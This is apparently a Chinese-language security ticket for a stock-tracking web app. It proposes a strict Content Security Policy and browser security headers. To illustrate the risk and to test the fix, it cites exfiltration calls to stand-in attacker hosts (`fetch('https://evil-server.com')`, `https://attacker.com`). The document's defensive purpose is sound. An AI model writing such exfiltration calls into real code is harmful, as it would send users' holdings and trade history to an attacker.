# 技術債 #0033: 內容安全策略 (CSP) 與瀏覽器端防禦加固

- **狀態**：`OPEN`
- **優先級**：`P1`
- **發現來源**：資安架構深度審查
- **建立日期**：2026-09-02
- **標籤**：`Security` · `CSP` · `Headers` · `BrowserHardening` · `AntiClickjacking`

---

## 1. 背景與現狀代碼 (Context & Current Code)

目前專案的 HTML 入口點 [index.html](file:///d:/APP/股票紀錄/index.html) 中僅定義了標準的 UTF-8 編碼與 Viewport 設定：

```html
<!DOCTYPE html>
<html lang="zh-TW">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>股票交易紀錄與分析儀 | 繁中雙市場版</title>
    <!-- 未設定任何 Content-Security-Policy 與安全標頭 -->
  </head>
```

---

## 2. 問題分析與潛在風險 (Problem & Risk Analysis)

1. **數據外洩無邊界防護 (Unrestricted Data Exfiltration)**：
   - 缺乏 `connect-src` 限制，代表若有任何注入漏洞或遭惡意套件篡改，攻擊者可在前端透過 `fetch('https://evil-server.com', ...)` 自由將使用者的所有持倉、資產淨值、交易歷史傳送至任意不受控之伺服器。
2. **跨站腳本與惡意資源注入 (XSS / Untrusted Scripts)**：
   - 缺乏 `script-src` 限制，允許載入未經審核的外部 CDN 腳本。
3. **點擊劫持與 iframe 嵌入風險 (Clickjacking)**：
   - 未限制 `frame-ancestors`，惡意網站可透過隱形 `<iframe>` 嵌入本應用程式，引導使用者進行未授權的誤操作或點擊。

---

## 3. 建議加固方案 (Proposed Hardening Solution)

### A. 在 `index.html` 注入嚴格的 CSP Meta 標籤
建立最小權限定義的 Content Security Policy：

```html
<meta
  http-equiv="Content-Security-Policy"
  content="
    default-src 'self';
    script-src 'self';
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    font-src 'self' https://fonts.gstatic.com;
    img-src 'self' data: https:;
    connect-src 'self' 
      https://query1.finance.yahoo.com 
      https://openapi.twse.com.tw 
      https://www.tpex.org.tw 
      https://api.finmindtrade.com 
      https://financialmodelingprep.com 
      https://www.alphavantage.co 
      https://corsproxy.io 
      https://api.allorigins.win 
      https://api.codetabs.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
  "
/>
```

### B. 瀏覽器安全標頭 (Vite Dev Server & Preview)
在 `vite.config.ts` 中配置安全標頭：
- `X-Frame-Options: DENY`
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy: strict-origin-when-cross-origin`

---

## 4. 驗收標準 (Acceptance Criteria)

- [ ] 載入應用程式時，CSP 正常生效且不阻礙 Google Fonts、本機 IndexedDB 與已授權之金融 API 連線。
- [ ] 若嘗試發起非白名單網址的 `fetch()` 請求（如 `https://attacker.com`），瀏覽器 DevTools Console 應出現 CSP 阻斷警告且請求被直接拒絕。
- [ ] 驗證無法在第三方網頁以 `<iframe>` 嵌入本應用程式。

---

## 5. 觸發處理時機 (Trigger Conditions)

- 準備發布正式生產版本或部署至 GitHub Pages / 雲端託管環境時。
